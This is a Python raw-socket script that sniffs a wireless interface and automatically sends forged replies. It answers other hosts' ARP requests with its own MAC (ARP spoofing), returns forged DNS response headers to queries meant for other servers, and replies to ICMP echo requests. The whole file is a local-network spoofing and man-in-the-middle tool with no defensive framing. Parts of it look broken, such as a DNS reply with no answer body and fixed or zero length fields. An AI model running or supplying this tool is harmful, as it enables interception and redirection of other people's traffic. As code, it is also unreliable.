from struct import *
import socket
import  binascii
from getmac import  get_mac_address as gma


def get_host_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

class create_ethernet_packet:
    def __init__(self,des_mac,source_mac,protocol):
        self.des_mac = des_mac
        self.s_mac = source_mac
        self.protocol = protocol

    def create_eth_header(self):
        packet = pack("!6s6sH", self.des_mac, self.s_mac, self.protocol)
        return packet


class create_arp_packet:

    def __init__(self,hardwaretype,protocoltype,hardwarelength,protocolelength,opcode,sendermac,senderip,targetmac,targetip):
        self.htype = hardwaretype
        self.ptype = protocoltype
        self.hlength = hardwarelength
        self.plength = protocolelength
        self.opcode = opcode
        self.sourcemac = sendermac
        self.sourceip = socket.inet_aton(senderip)
        self.desmac = targetmac
        self.desip = socket.inet_aton(targetip)

    def create_arp_packet(self):
        packet = pack("!H H B B H 6s 4s 6s 4s",self.htype,self.ptype,self.hlength,self.plength,self.opcode,self.sourcemac,
                      self.sourceip,self.desmac,self.desip)
        return packet


class create_ip_header:
    def __init__(self,src_ip,dest_ip,protocol):
        self.version = 0x4
        self.ihl = 0x5
        self.type_of_service = 0x0
        self.total_length = 0
        self.identification = 0x35fe
        self.flags = 0x4
        self.fragment_offset = 0x0
        self.ttl = 64
        self.protocol = protocol
        self.header_checksum = 0x0
        self.src_ip = src_ip
        self.dest_ip = dest_ip
        self.src_addr = socket.inet_aton(src_ip)
        self.dest_addr = socket.inet_aton(dest_ip)
        self.v_ihl = (self.version << 4) + self.ihl
        self.flag_fragoff = (self.flags << 12) + self.fragment_offset

    def ip_header(self):
        tmp_ip_header = pack("!BBHHHBBH4s4s", self.v_ihl, self.type_of_service, self.total_length,
                                 self.identification, self.flag_fragoff,
                                 self.ttl, self.protocol, self.header_checksum,
                                 self.src_addr,
                                 self.dest_addr)

        final_ip_header = pack("!BBHHHBBH4s4s", self.v_ihl, self.type_of_service, self.total_length,
                               self.identification, self.flag_fragoff,
                               self.ttl, self.protocol, self.calc_checksum(tmp_ip_header),
                               self.src_addr,
                               self.dest_addr)
        return final_ip_header

    def calc_checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + msg[i + 1]
            s = s + w

        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s


class create_udp_header:
    def __init__(self,src_port,des_port,srcip, desip,):
        self.sorce_port = src_port
        self.des_port = des_port
        self.length = 20
        self.checksum = 0
        self.srcip = socket.inet_aton(srcip)
        self.desip = socket.inet_aton(desip)

    def calc_checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + msg[i + 1]
            s = s + w

        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def udp_header(self):
        udp = pack("!HHHH",self.sorce_port,self.des_port,self.length,self.checksum)
        pseudo_header = pack("!4s4sBBH",self.srcip , self.desip, self.checksum, 17,
                             len(udp))

        p = pseudo_header + udp
        p = self.calc_checksum(p)
        udp = pack("!HHHH", self.sorce_port, self.des_port, self.length,p)
        return udp


class create_icmp_packet:
    def __init__(self, id,data, type=0, code=0,checksum=0 ,seq=1):
        #ICMP HEADER
        self.icmp_type = type
        self.icmp_code = code
        self.icmp_check = checksum
        self.icmp_id = id
        self.icmp_seq = seq
        self.data = data

    def create_main_packet(self):
        self.raw = pack("!BBHHH", self.icmp_type, self.icmp_code,self.icmp_check,  self.icmp_id, self.icmp_seq)

        # calculate checksum
        self.icmp_check = self.calc_checksum(self.raw + self.data)

        self.raw = pack("!BBHHH",self.icmp_type,  self.icmp_code, self.icmp_check,  self.icmp_id,self.icmp_seq)

        return self.raw + self.data

    def calc_checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + msg[i + 1]
            s = s + w

        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s


class dns_header:
    def __init__(self):
        self.identification = 0x94a8
        self.flag = 0x8180
        self.number_quenstion = 1
        self.number_answer = 1
        self.number_auth = 0
        self.number_additonal = 0

    def create_dns_header(self):
        dns = pack("!HHHHHH",self.identification,self.flag,self.number_quenstion,self.number_answer,self.number_auth,self.number_additonal)
        return dns


def arp(srcmac, desmac,senderip,targetip):
    ethclass = create_ethernet_packet(desmac,srcmac, 0x0806)
    eth = ethclass.create_eth_header()
    arpclass = create_arp_packet(1, 0x0800, 6, 4, 2,srcmac, senderip,
                                   desmac, targetip)
    arp = arpclass.create_arp_packet()
    mainpacket = eth + arp
    mysocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.htons(3)))
    mysocket.bind(('wlan0', 0))
    mysocket.send(mainpacket)
    mysocket.close()


def icmp(desmac,desip,sourcemac,id,data):
    ethc = create_ethernet_packet(desmac,sourcemac, 0x0800)
    eth = ethc.create_eth_header()
    ipclass = create_ip_header(get_host_ip_address(), desip, 1)
    ip = ipclass.ip_header()
    icmpclass = create_icmp_packet(id,data)
    icmp = icmpclass.create_main_packet()
    final = eth + ip + icmp
    mysocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.htons(3)))
    mysocket.bind(('wlan0', 0))
    mysocket.send(final)

    mysocket.close()

def dns(desmac,destip,srcmac,desport):
    ethc = create_ethernet_packet(desmac, srcmac, 0x0800)
    eth = ethc.create_eth_header()
    ipclass = create_ip_header(get_host_ip_address(), destip, 17)
    ip = ipclass.ip_header()

    udpclass = create_udp_header(53, desport, get_host_ip_address(),destip)
    udp = udpclass.udp_header()
    dnsclass = dns_header()
    dns = dnsclass.create_dns_header()

    final = eth + ip + udp + dns

    mysocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.htons(3)))
    mysocket.bind(('wlan0', 0))
    mysocket.send(final)
    mysocket.close()

# **********MAIN*************


conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
mac = ''
mymac = gma().split(":")
for i in range(len(mymac)):
    mac = mac + mymac[i]

while 1:
    data, addr = conn.recvfrom(65535)
    eth_proto, = unpack("!H",data[12:14])
    eth_proto = socket.ntohs(eth_proto)
    if eth_proto == 1544:
        opcode, = unpack("!H", data[20:22])
        src, = unpack("!6s",data[6:12])
        main, =  unpack("!6s",data[6:12])
        src = (binascii.hexlify(src)).decode('ascii')
        if opcode == 1 and src != mac:
            desip,= unpack("!4s", data[28:32])
            srcip, = unpack("!4s",data[38:42])
            desip = socket.inet_ntoa(desip)
            srcip = socket.inet_ntoa(srcip)
            source =  binascii.unhexlify(mac)
            destination = binascii.unhexlify(src)
            arp(source,destination,srcip,desip)

    elif eth_proto == 8:
        protocol, = unpack("!B", data[23:24])
        if protocol == 17:
            srcport, desport = unpack("!HH",data[34:38])
            if desport == 53:
                destip, = unpack("!4s",data[26:30])
                destip = socket.inet_ntoa(destip)
                if destip != get_host_ip_address():
                    desmac, = unpack("!6s",data[6:12])
                    sourcemac = binascii.unhexlify(mac)
                    dns(desmac,destip,sourcemac,srcport)

        elif protocol == 1:
            type, = unpack("!B",data[34:35])
            srcip, = unpack("!4s", data[26:30])
            srcip = socket.inet_ntoa(srcip)
            if type == 8 and srcip != get_host_ip_address():
                desmac, = unpack("!6s", data[6:12])
                sourcemac = binascii.unhexlify(mac)
                id, = unpack("!H",data[38:40])
                data = data[50:]
                icmp(desmac, srcip,sourcemac,id,data)






























